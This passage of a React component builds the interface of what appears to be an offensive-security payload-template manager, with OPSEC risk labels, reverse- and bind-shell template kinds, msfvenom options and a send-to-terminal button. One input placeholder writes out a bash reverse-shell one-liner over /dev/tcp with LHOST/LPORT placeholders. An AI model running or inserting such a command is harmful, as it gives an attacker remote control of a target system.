                              ? 'rgba(245, 158, 11, 0.2)'
                              : 'rgba(16, 185, 129, 0.2)',
                          color:
                            currentTemplate.opsecRisk === 'high'
                              ? '#f87171'
                              : currentTemplate.opsecRisk === 'medium'
                              ? '#fbbf24'
                              : '#34d399',
                          border:
                            currentTemplate.opsecRisk === 'high'
                              ? '1px solid #ef4444'
                              : currentTemplate.opsecRisk === 'medium'
                              ? '1px solid #f59e0b'
                              : '1px solid #10b981',
                          fontWeight: 600,
                        }}
                      >
                        OPSEC: {currentTemplate.opsecRisk ? currentTemplate.opsecRisk.toUpperCase() : 'LOW'}
                      </span>
                    </div>
                    {currentTemplate.description && (
                      <div style={{ fontSize: '0.78rem', color: '#94a3b8', marginTop: '0.3rem' }}>
                        {currentTemplate.description}
                      </div>
                    )}
                  </div>

                  {/* Template management buttons */}
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.45rem' }}>
                    <button
                      type="button"
                      className="cyber-hud-btn btn-sm"
                      onClick={() => setEditingTemplate({ ...currentTemplate })}
                      title="Edit template details or command"
                      style={{ fontSize: '0.72rem', display: 'flex', alignItems: 'center', gap: '0.35rem' }}
                    >
                      <CyberIcon name="edit" size={12} />
                      <span>Edit Template</span>
                    </button>
                    <button
                      type="button"
                      className="cyber-hud-btn btn-sm btn-danger"
                      onClick={() => void handleDeleteTemplate(currentTemplate)}
                      title="Delete template from external file"
                      style={{ padding: '0.3rem 0.45rem' }}
                    >
                      <CyberIcon name="trash" size={12} />
                    </button>
                  </div>
                </div>

                {/* OPSEC Warnings Box (if any) */}
                {renderResult && renderResult.opsecWarnings && renderResult.opsecWarnings.length > 0 && (
                  <div
                    style={{
                      padding: '0.75rem 1rem',
                      backgroundColor: 'rgba(245, 158, 11, 0.12)',
                      border: '1px solid rgba(245, 158, 11, 0.4)',
                      borderRadius: '4px',
                      color: '#fef08a',
                      fontSize: '0.76rem',
                    }}
                  >
                    <div style={{ fontWeight: 700, marginBottom: '0.25rem', display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                      <CyberIcon name="shield" size={14} />
                      <span>OPSEC RISK NOTICE // SIGNATURE & EGRESS RESTRICTIONS</span>
                    </div>
                    <ul style={{ margin: 0, paddingLeft: '1.25rem' }}>
                      {renderResult.opsecWarnings.map((w, idx) => (
                        <li key={idx} style={{ marginTop: '0.2rem' }}>
                          {w}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {/* Template Notes / Requirements */}
                {currentTemplate.notes && (
                  <div
                    style={{
                      padding: '0.55rem 0.85rem',
                      backgroundColor: 'rgba(15, 23, 42, 0.7)',
                      border: '1px solid rgba(0, 240, 255, 0.15)',
                      borderRadius: '3px',
                      fontSize: '0.74rem',
                      color: '#cbd5e1',
                    }}
                  >
                    <span style={{ color: 'var(--color-primary-cyan, #00f0ff)', fontWeight: 600 }}>
                      Operational Notes:{' '}
                    </span>
                    {currentTemplate.notes}
                  </div>
                )}

                {/* Main Command Output or Empty Prompt */}
                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0 }}>
                  <div
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      marginBottom: '0.45rem',
                    }}
                  >
                    <span
                      style={{
                        fontSize: '0.74rem',
                        fontWeight: 600,
                        color: 'var(--color-primary-cyan, #00f0ff)',
                        letterSpacing: '0.05em',
                      }}
                    >
                      RENDERED PAYLOAD // READY FOR EXECUTION:
                    </span>
                    {rendering && (
                      <span style={{ fontSize: '0.7rem', color: '#94a3b8' }}>Rendering...</span>
                    )}
                  </div>

                  {!currentTemplate.command || currentTemplate.command.trim() === '' ? (
                    /* Command not populated yet prompt */
                    <div
                      style={{
                        flex: 1,
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        justifyContent: 'center',
                        backgroundColor: 'rgba(4, 9, 18, 0.95)',
                        border: '1px dashed rgba(245, 158, 11, 0.4)',
                        borderRadius: '4px',
                        padding: '2rem 1.5rem',
                        textAlign: 'center',
                      }}
                    >
                      <div style={{ color: '#fbbf24', marginBottom: '0.5rem' }}>
                        <CyberIcon name="terminal" size={28} />
                      </div>
                      <div style={{ fontSize: '0.88rem', fontWeight: 600, color: '#fef08a' }}>
                        Template Command Ready for Population
                      </div>
                      <div
                        style={{
                          fontSize: '0.76rem',
                          color: '#94a3b8',
                          maxWidth: '520px',
                          marginTop: '0.5rem',
                          lineHeight: '1.4',
                        }}
                      >
                        This template is registered in the external file (
                        <code>{fileConfig?.filePath ? fileConfig.filePath.split(/[\\/]/).pop() : 'payload_templates.json'}</code>
                        ) without hardcoded commands. Click below to populate the operational command using{' '}
                        <code style={{ color: 'var(--color-primary-cyan, #00f0ff)' }}>&#123;&#123;LHOST&#125;&#125;</code> and{' '}
                        <code style={{ color: 'var(--color-primary-cyan, #00f0ff)' }}>&#123;&#123;LPORT&#125;&#125;</code> placeholders.
                      </div>
                      <button
                        type="button"
                        className="cyber-hud-btn btn-sm btn-primary"
                        onClick={() => setEditingTemplate({ ...currentTemplate })}
                        style={{ marginTop: '1rem', display: 'flex', alignItems: 'center', gap: '0.4rem' }}
                      >
                        <CyberIcon name="edit" size={13} />
                        <span>Populate Template Command</span>
                      </button>
                    </div>
                  ) : (
                    /* Rendered command box */
                    <div
                      style={{
                        flex: 1,
                        backgroundColor: '#030712',
                        border: '1px solid rgba(0, 240, 255, 0.3)',
                        borderRadius: '4px',
                        padding: '1rem',
                        overflowY: 'auto',
                        position: 'relative',
                        boxShadow: 'inset 0 0 15px rgba(0, 0, 0, 0.8)',
                      }}
                    >
                      <pre
                        style={{
                          margin: 0,
                          fontSize: '0.84rem',
                          lineHeight: '1.5',
                          color: '#38bdf8',
                          whiteSpace: 'pre-wrap',
                          wordBreak: 'break-all',
                        }}
                      >
                        {renderResult ? renderResult.rendered : currentTemplate.command}
                      </pre>
                    </div>
                  )}
                </div>

                {/* Bottom Action Buttons */}
                {currentTemplate.command && currentTemplate.command.trim() !== '' && (
                  <div
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'flex-end',
                      gap: '0.65rem',
                      paddingTop: '0.75rem',
                      borderTop: '1px solid rgba(0, 240, 255, 0.15)',
                    }}
                  >
                    <button
                      type="button"
                      className={`cyber-hud-btn btn-sm ${copyFeedback ? 'btn-primary' : ''}`}
                      onClick={() => void handleCopy()}
                      style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', padding: '0.4rem 0.85rem' }}
                    >
                      <CyberIcon name="copy" size={13} />
                      <span>{copyFeedback ? 'Copied to Clipboard!' : 'Copy Payload'}</span>
                    </button>

                    <button
                      type="button"
                      className="cyber-hud-btn btn-sm"
                      onClick={() => void handleSaveSnippet()}
                      disabled={savingSnippet}
                      style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', padding: '0.4rem 0.85rem' }}
                    >
                      <CyberIcon name="save" size={13} />
                      <span>{savingSnippet ? 'Saving...' : 'Save as Snippet (F-15)'}</span>
                    </button>

                    {activeSessionId && onSendToTerminal && (
                      <button
                        type="button"
                        className="cyber-hud-btn btn-sm btn-primary"
                        onClick={handleSendTerminal}
                        style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', padding: '0.4rem 0.85rem' }}
                      >
                        <CyberIcon name="terminal" size={13} />
                        <span>Send to Terminal</span>
                      </button>
                    )}
                  </div>
                )}
              </div>
            ) : (
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  height: '100%',
                  color: '#64748b',
                }}
              >
                Select a payload template from the left panel.
              </div>
            )}
          </div>
        </div>

        {/* Template Edit / Creation Modal */}
        {editingTemplate && (
          <div
            style={{
              position: 'absolute',
              inset: 0,
              backgroundColor: 'rgba(2, 6, 14, 0.92)',
              backdropFilter: 'blur(4px)',
              zIndex: 1200,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              padding: '1.5rem',
            }}
          >
            <div
              style={{
                width: '100%',
                maxWidth: '680px',
                backgroundColor: '#050c1a',
                border: '1px solid var(--color-primary-cyan, #00f0ff)',
                borderRadius: '4px',
                boxShadow: '0 0 25px rgba(0, 240, 255, 0.3)',
                padding: '1.25rem',
                display: 'flex',
                flexDirection: 'column',
                gap: '0.85rem',
                maxHeight: '85vh',
                overflowY: 'auto',
              }}
            >
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  borderBottom: '1px solid rgba(0, 240, 255, 0.25)',
                  paddingBottom: '0.65rem',
                }}
              >
                <div style={{ fontSize: '0.92rem', fontWeight: 700, color: 'var(--color-primary-cyan, #00f0ff)' }}>
                  {editingTemplate.id.startsWith('tmpl-') && templates.some((t) => t.id === editingTemplate.id)
                    ? 'EDIT PAYLOAD TEMPLATE'
                    : 'NEW PAYLOAD TEMPLATE'}
                </div>
                <button
                  type="button"
                  className="cyber-hud-btn btn-sm"
                  onClick={() => setEditingTemplate(null)}
                >
                  <CyberIcon name="close" size={13} />
                </button>
              </div>

              {/* Template Name & OS */}
              <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '0.75rem' }}>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Template Name *
                  </label>
                  <input
                    type="text"
                    className="cyber-hud-input"
                    value={editingTemplate.name}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, name: e.target.value })}
                    placeholder="e.g. Bash - Dev TCP Reverse"
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Target OS
                  </label>
                  <select
                    className="cyber-hud-select"
                    value={editingTemplate.os}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, os: e.target.value as PayloadOS })}
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  >
                    <option value="linux">Linux</option>
                    <option value="windows">Windows</option>
                    <option value="macos">macOS</option>
                    <option value="any">Any OS</option>
                  </select>
                </div>
              </div>

              {/* Shell & Kind & Default Port */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '0.75rem' }}>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Shell / Interpreter
                  </label>
                  <input
                    type="text"
                    className="cyber-hud-input"
                    value={editingTemplate.shell}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, shell: e.target.value })}
                    placeholder="e.g. bash, powershell"
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Kind
                  </label>
                  <select
                    className="cyber-hud-select"
                    value={editingTemplate.kind}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, kind: e.target.value })}
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  >
                    <option value="reverse">Reverse Shell</option>
                    <option value="bind">Bind Shell</option>
                    <option value="one-liner">One-Liner</option>
                    <option value="msfvenom">Msfvenom</option>
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Default Port
                  </label>
                  <input
                    type="number"
                    className="cyber-hud-input"
                    value={editingTemplate.defaultPort || 443}
                    onChange={(e) =>
                      setEditingTemplate({ ...editingTemplate, defaultPort: parseInt(e.target.value, 10) || 443 })
                    }
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>
              </div>

              {/* OPSEC Risk & Description */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '0.75rem' }}>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    OPSEC Risk Level
                  </label>
                  <select
                    className="cyber-hud-select"
                    value={editingTemplate.opsecRisk || 'low'}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, opsecRisk: e.target.value })}
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  >
                    <option value="low">Low Risk</option>
                    <option value="medium">Medium Risk</option>
                    <option value="high">High Risk (Detection Likely)</option>
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                    Description
                  </label>
                  <input
                    type="text"
                    className="cyber-hud-input"
                    value={editingTemplate.description || ''}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, description: e.target.value })}
                    placeholder="Brief description of this payload"
                    style={{ width: '100%', fontSize: '0.82rem' }}
                  />
                </div>
              </div>

              {/* Command Body */}
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                  <label style={{ fontSize: '0.72rem', color: '#94a3b8' }}>
                    Payload Command Template * (Use &#123;&#123;LHOST&#125;&#125; and &#123;&#123;LPORT&#125;&#125;)
                  </label>
                  <span style={{ fontSize: '0.68rem', color: 'var(--color-primary-cyan, #00f0ff)' }}>
                    Saved to external JSON file
                  </span>
                </div>
                <textarea
                  className="cyber-hud-input"
                  rows={5}
                  value={editingTemplate.command}
                  onChange={(e) => setEditingTemplate({ ...editingTemplate, command: e.target.value })}
                  placeholder="e.g. bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
                  style={{
                    width: '100%',
                    fontFamily: 'var(--font-mono, monospace)',
                    fontSize: '0.8rem',
                    lineHeight: '1.4',
                  }}
                />
              </div>

              {/* Operational Notes */}
              <div>
                <label style={{ fontSize: '0.72rem', color: '#94a3b8', display: 'block', marginBottom: '0.25rem' }}>
                  Operational Notes & Pre-requisites
                </label>
                <input
                  type="text"
                  className="cyber-hud-input"
                  value={editingTemplate.notes || ''}
                  onChange={(e) => setEditingTemplate({ ...editingTemplate, notes: e.target.value })}
                  placeholder="e.g. Requires python3 installed on target"
                  style={{ width: '100%', fontSize: '0.82rem' }}
                />
              </div>

              {/* Form buttons */}
              <div
                style={{
                  display: 'flex',
                  justifyContent: 'flex-end',
                  gap: '0.65rem',
                  paddingTop: '0.5rem',
                  borderTop: '1px solid rgba(0, 240, 255, 0.2)',
                }}
              >
                <button
                  type="button"
                  className="cyber-hud-btn btn-sm"
                  onClick={() => setEditingTemplate(null)}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  className="cyber-hud-btn btn-sm btn-primary"
                  onClick={() => void handleSaveTemplateForm()}
                  disabled={savingTemplate}
                >
                  {savingTemplate ? 'Saving...' : 'Save to External File'}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
